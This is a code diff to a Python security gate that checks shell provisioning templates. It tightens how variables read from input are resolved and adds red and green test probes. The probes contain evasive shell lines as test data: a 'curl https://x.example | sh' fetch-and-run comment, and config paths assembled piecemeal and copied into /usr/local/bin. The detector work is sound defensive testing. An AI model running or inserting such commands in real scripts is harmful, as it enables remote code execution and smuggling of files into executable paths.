@@ -2455,11 +2455,14 @@ def var_values(stmts: list) -> dict:
     """NAME -> every literal text the template assigns it (assignment, export, local,
     declare, for-loop word) (#5095). A value only adds uses in expand_uses (the original
     use stays), so a name an unquoted expansion splits keeps its values and also holds
-    each field (#5356); only a name read from input is left out (#5100). A nameref can
+    each field, and a name read from input keeps every literal it is assigned anywhere,
+    since a read may run after the use, may not run, or may run in a subshell (#5356,
+    5-agent vote 4d3ea1c5). An IFS the gate cannot read collapses each split name past
+    the cap. A nameref can
     carry any name's value to any other name, so a template that declares one maps every
     name to VALUES_PAST_CAP (ANY_NAME): every use through a name reads as the root use
     (fail closed, #5356, #4869)."""
-    vals, unknown = {}, set()
+    vals = {}
     for _w, stmt, _st in stmts:
         text = tf_render(stmt)
         for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?(\+?)=(\S*)", text):
@@ -2478,22 +2481,20 @@ def var_values(stmts: list) -> dict:
         for m in re.finditer(r"(?:^|[\s;&|(])for\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", text):
             for wd in m.group(2).split():
                 vals.setdefault(m.group(1), set()).add(unquote(wd)[0])
-        for m in re.finditer(r"(?:^|[\s;&|(])(?:read|mapfile|readarray)\b([^;&|\n]*)", text):
-            unknown.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(1)))
-        unknown.update(re.findall(r"\bprintf\s+-v\s*([A-Za-z_]\w*)", text))
-        unknown.update(re.findall(r"\bgetopts\s+\S+\s+([A-Za-z_]\w*)", text))
     texts = [tf_render(stmt) for _w, stmt, _st in stmts]
     refs, poisoned = nameref_facts(texts)
     if refs or poisoned:
         return {ANY_NAME: {VALUES_PAST_CAP}}
     # an IFS the gate cannot read leaves every split name unresolved in binary_vars, so
     # each operand through one is red there; here the fields are cut on the known IFS
-    split, _poisoned, seps = split_names(texts)
+    split, split_poisoned, seps = split_names(texts)
     cut = re.compile("[%s]+" % re.escape("".join(sorted(seps))))
     for k in split & set(vals):
-        if VALUES_PAST_CAP not in vals[k]:
+        if split_poisoned:
+            vals[k] = {VALUES_PAST_CAP}
+        elif VALUES_PAST_CAP not in vals[k]:
             vals[k] = vals[k] | {f for v in vals[k] for f in cut.split(v) if f}
-    return {k: v for k, v in vals.items() if k not in unknown}
+    return vals
 
 
 EXPAND_CAP = 64
@@ -3205,7 +3206,14 @@ def build_probes() -> list:
         [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
         autolist=True, present="is an expansion or command substitution")
     # a name read from input has no known value: its literal assignments are not expanded (#5095 pin, #5100)
-    green("R3-C read names are not expanded from their assignments (#5100)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
+    # a name read from input keeps every literal it is assigned: the read may run after
+    # the use, may not run, or may run in a pipeline subshell, so this #5100 green form is
+    # red now (#5356, 5-agent vote 4d3ea1c5)
+    red('R3-C read names keep the literals they are assigned (#5100, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
+    red('data-home file copied before a later read of the same name, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; cp "$F" /usr/local/bin/; read F\n' + dec)], autolist=True)
+    red('data-home file copied after a read that may not run, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; if false; then read F; fi; cp "$F" /usr/local/bin/\n' + dec)], autolist=True)
+    red('data-home file copied after a read in a pipeline subshell, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-memory/r; P+=un.conf; echo x | read P; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
+    green('data-home file kept as data next to a read into a name that never held a data-home path (#5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/srv/x; read P < /dev/null; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
     green("data-home file kept as data next to split and appended names that do not name it (#5356)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/var/r; F+="un.conf /x"; cp $F /usr/local/bin/; IFS=:; G=x:/var/r; G+=u*; cp $G /usr/local/bin/\n' + dec)], autolist=True)
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
